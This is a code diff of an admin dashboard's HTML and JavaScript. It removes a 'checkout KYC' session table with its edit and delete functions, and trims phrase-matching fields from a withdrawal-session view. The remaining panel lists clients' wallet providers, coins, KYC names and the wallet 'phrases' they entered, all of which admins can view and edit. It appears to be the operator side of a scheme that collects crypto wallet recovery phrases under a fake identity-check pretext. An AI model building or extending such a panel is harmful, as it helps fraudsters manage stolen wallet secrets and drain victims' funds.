@@ -80,30 +80,6 @@
     </div>
 
     <div class="section">
-        <h2>Checkout KYC Sessions</h2>
-        <div id="phraseLoading" class="loading">Loading checkout KYC sessions...</div>
-        <table id="phraseTable" style="display:none;">
-            <thead>
-                <tr>
-                    <th>Time</th>
-                    <th>Session ID</th>
-                    <th>Client ID</th>
-                    <th>Item</th>
-                    <th>Amount</th>
-                    <th>Network</th>
-                    <th>Wallet</th>
-                    <th>KYC Name</th>
-                    <th>Input Phrase</th>
-                    <th>Expected Phrase</th>
-                    <th>Match</th>
-                    <th>Action</th>
-                </tr>
-            </thead>
-            <tbody id="phraseTableBody"></tbody>
-        </table>
-    </div>
-
-    <div class="section">
         <h2>Withdrawal KYC Sessions</h2>
         <div id="withdrawLoading" class="loading">Loading withdrawal KYC sessions...</div>
         <table id="withdrawTable" style="display:none;">
@@ -117,8 +93,6 @@
                     <th>Wallet</th>
                     <th>KYC Name</th>
                     <th>Input Phrase</th>
-                    <th>Expected Phrase</th>
-                    <th>Match</th>
                     <th>Status</th>
                     <th>Action</th>
                 </tr>
@@ -149,27 +123,6 @@
         </div>
     </div>
 
-    <div id="phraseEditModal" class="modal">
-        <div class="modal-content">
-            <span class="close-btn" data-close="phraseEditModal">&times;</span>
-            <h2>Edit Checkout KYC Session</h2>
-            <form id="phraseEditForm">
-                <input type="hidden" id="phraseSessionId">
-                <label>Input Phrase</label>
-                <input type="text" id="phraseInputEdit" required>
-                <label>Expected Phrase</label>
-                <input type="text" id="phraseChallengeEdit" required>
-                <label>Match</label>
-                <select id="phraseMatchEdit">
-                    <option value="true">Verified</option>
-                    <option value="false">Failed</option>
-                </select>
-                <button type="submit" class="update-btn">Update Session</button>
-                <p id="phraseEditMessage"></p>
-            </form>
-        </div>
-    </div>
-
     <div id="withdrawEditModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" data-close="withdrawEditModal">&times;</span>
@@ -178,13 +131,6 @@
                 <input type="hidden" id="withdrawSessionId">
                 <label>Input Phrase</label>
                 <input type="text" id="withdrawInputEdit" required>
-                <label>Expected Phrase</label>
-                <input type="text" id="withdrawChallengeEdit" required>
-                <label>Match</label>
-                <select id="withdrawMatchEdit">
-                    <option value="true">Verified</option>
-                    <option value="false">Failed</option>
-                </select>
                 <label>Status</label>
                 <select id="withdrawStatusEdit">
                     <option value="pending">Pending</option>
@@ -536,97 +482,6 @@
             }, 400);
         }
 
-        async function fetchPhraseSessions() {
-            const loading = document.getElementById('phraseLoading');
-            const table = document.getElementById('phraseTable');
-            const tbody = document.getElementById('phraseTableBody');
-            try {
-                const response = await adminFetch(`${API_BASE_URL}/api/admin/phrase-sessions?_=${Date.now()}`);
-                const data = await response.json();
-                const sessions = data.sessions || [];
-                tbody.innerHTML = '';
-
-                if (!sessions.length) {
-                    loading.textContent = 'No checkout KYC sessions yet.';
-                    table.style.display = 'none';
-                    return;
-                }
-
-                sessions.forEach((s) => {
-                    const row = tbody.insertRow();
-                    row.insertCell().textContent = safeDate(s.createdAt);
-                    row.insertCell().textContent = s.sessionId;
-                    row.insertCell().textContent = s.clientId;
-                    row.insertCell().textContent = s.item;
-                    row.insertCell().textContent = s.amount;
-                    row.insertCell().textContent = s.network;
-                    row.insertCell().textContent = s.walletProvider;
-                    row.insertCell().textContent = s.kycFullName;
-                    row.insertCell().textContent = s.phraseInput;
-                    row.insertCell().textContent = s.challenge;
-                    row.insertCell().textContent = s.isPhraseMatch ? 'Verified' : 'Failed';
-
-                    const action = row.insertCell();
-                    const editBtn = document.createElement('button');
-                    editBtn.className = 'edit-btn';
-                    editBtn.textContent = 'Edit';
-                    editBtn.onclick = () => openPhraseEdit(s);
-                    action.appendChild(editBtn);
-
-                    const deleteBtn = document.createElement('button');
-                    deleteBtn.className = 'delete-btn';
-                    deleteBtn.textContent = 'Delete';
-                    deleteBtn.onclick = () => deletePhraseSession(s.sessionId);
-                    action.appendChild(deleteBtn);
-                });
-
-                loading.style.display = 'none';
-                table.style.display = 'table';
-            } catch (err) {
-                loading.textContent = `Error loading checkout KYC sessions: ${err.message}`;
-            }
-        }
-
-        function openPhraseEdit(session) {
-            document.getElementById('phraseSessionId').value = session.sessionId;
-            document.getElementById('phraseInputEdit').value = session.phraseInput || '';
-            document.getElementById('phraseChallengeEdit').value = session.challenge || '';
-            document.getElementById('phraseMatchEdit').value = String(Boolean(session.isPhraseMatch));
-            document.getElementById('phraseEditMessage').textContent = '';
-            document.getElementById('phraseEditModal').style.display = 'block';
-        }
-
-        document.getElementById('phraseEditForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const sessionId = document.getElementById('phraseSessionId').value;
-            const payload = {
-                phraseInput: document.getElementById('phraseInputEdit').value,
-                challenge: document.getElementById('phraseChallengeEdit').value,
-                isPhraseMatch: document.getElementById('phraseMatchEdit').value === 'true'
-            };
-            const msg = document.getElementById('phraseEditMessage');
-            msg.textContent = 'Updating...';
-            const response = await adminFetch(`${API_BASE_URL}/api/admin/phrase-sessions/${encodeURIComponent(sessionId)}`, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            const data = await response.json();
-            if (!response.ok || !data.success) {
-                msg.textContent = data.message || 'Update failed.';
-                return;
-            }
-            msg.textContent = 'Checkout KYC updated.';
-            fetchPhraseSessions();
-            setTimeout(() => { document.getElementById('phraseEditModal').style.display = 'none'; }, 700);
-        };
-
-        async function deletePhraseSession(sessionId) {
-            if (!confirm(`Delete checkout session ${sessionId}?`)) return;
-            await adminFetch(`${API_BASE_URL}/api/admin/phrase-sessions/${encodeURIComponent(sessionId)}`, { method: 'DELETE' });
-            fetchPhraseSessions();
-        }
-
         async function fetchWithdrawSessions() {
             const loading = document.getElementById('withdrawLoading');
             const table = document.getElementById('withdrawTable');
@@ -653,8 +508,6 @@
                     row.insertCell().textContent = `${s.walletProvider} (${s.walletCoin || 'N/A'})`;
                     row.insertCell().textContent = s.kycFullName;
                     row.insertCell().textContent = s.phraseInput;
-                    row.insertCell().textContent = s.challenge;
-                    row.insertCell().textContent = s.isPhraseMatch ? 'Verified' : 'Failed';
                     row.insertCell().textContent = s.status || 'pending';
 
                     const action = row.insertCell();
@@ -681,8 +534,6 @@
         function openWithdrawEdit(session) {
             document.getElementById('withdrawSessionId').value = session.sessionId;
             document.getElementById('withdrawInputEdit').value = session.phraseInput || '';
-            document.getElementById('withdrawChallengeEdit').value = session.challenge || '';
-            document.getElementById('withdrawMatchEdit').value = String(Boolean(session.isPhraseMatch));
             document.getElementById('withdrawStatusEdit').value = session.status || 'pending';
             document.getElementById('withdrawEditMessage').textContent = '';
             document.getElementById('withdrawEditModal').style.display = 'block';
@@ -693,8 +544,6 @@
             const sessionId = document.getElementById('withdrawSessionId').value;
             const payload = {
                 phraseInput: document.getElementById('withdrawInputEdit').value,
-                challenge: document.getElementById('withdrawChallengeEdit').value,
-                isPhraseMatch: document.getElementById('withdrawMatchEdit').value === 'true',
                 status: document.getElementById('withdrawStatusEdit').value
             };
             const msg = document.getElementById('withdrawEditMessage');
@@ -722,7 +571,6 @@
 
         fetchClients();
         fetchClientSessions();
-        fetchPhraseSessions();
         fetchWithdrawSessions();
     </script>
 </body>
